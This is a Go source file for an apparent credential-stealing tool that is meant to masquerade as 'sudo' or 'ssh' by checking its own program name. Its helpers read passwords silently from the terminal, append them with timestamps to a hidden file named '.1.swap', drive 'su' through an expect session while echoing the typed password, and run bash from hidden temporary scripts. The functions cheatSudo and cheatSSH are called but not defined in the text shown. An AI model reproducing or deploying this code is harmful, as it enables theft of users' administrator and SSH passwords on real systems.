package main

import (
	"fmt"
	expect "github.com/google/goexpect"
	"github.com/howeyc/gopass"
	uuid "github.com/satori/go.uuid"
	"golang.org/x/crypto/ssh/terminal"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path"
	"regexp"
	"strings"
	"time"
)

//const tempPath = "/tmp"
//TODO 添加全局变量来设置选项
//TODO delete debug
const tempPath = "./"

var filename = path.Join(tempPath, ".1.swap")
var _, program = path.Split(os.Args[0])
var scriptName = path.Join(tempPath, "."+uuid.NewV4().String())

var fd = int(os.Stdin.Fd())
var cmd = program + " " + strings.Join(os.Args[1:], " ")

func main() {
	if program == "sudo" {
		cheatSudo()

	}
	//if program == "su"{
	//	cheatSu()
	//}
	if program == "ssh" {
		cheatSSH()
	}
}
func checkErr(err error) {
	if err != nil {
		//fmt.Println(err.Error())
		os.Exit(1)
	}
}

func cheatSu() bool {
	inputArg := strings.Join(os.Args[1:], " ")
	var anyRE = regexp.MustCompile(".+\n")
	//var b = make([]byte,1024)
	e, _, err := expect.Spawn("su "+inputArg, -1)
	if err != nil {
		return false
	}
	output, _, _ := e.Expect(anyRE, -1)
	fmt.Print(">>>" + output)
	pass, _ := gopass.GetPasswd()
	e.Send(string(pass) + "\r\n")
	fmt.Println("<<<" + string(pass))
	output, _, _ = e.Expect(anyRE, -1)
	fmt.Println(">>>" + output)

	return true
}
func writePassword(content string) {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()
	timeStr := time.Now().Format("2006-01-02 15:04:05")
	file.WriteString(timeStr + " " + program + " " + content + "\n")
}
func execScript(content string) {
	ioutil.WriteFile(scriptName, []byte(content), 777)
	c := exec.Command("/bin/bash", scriptName)
	c.Stdin = os.Stdin
	c.Stderr = os.Stderr
	c.Stdout = os.Stdout
	c.Run()
	os.Remove(scriptName)
}
func getPassword() string {
	bytePassword, _ := terminal.ReadPassword(fd)

	return string(bytePassword)
}
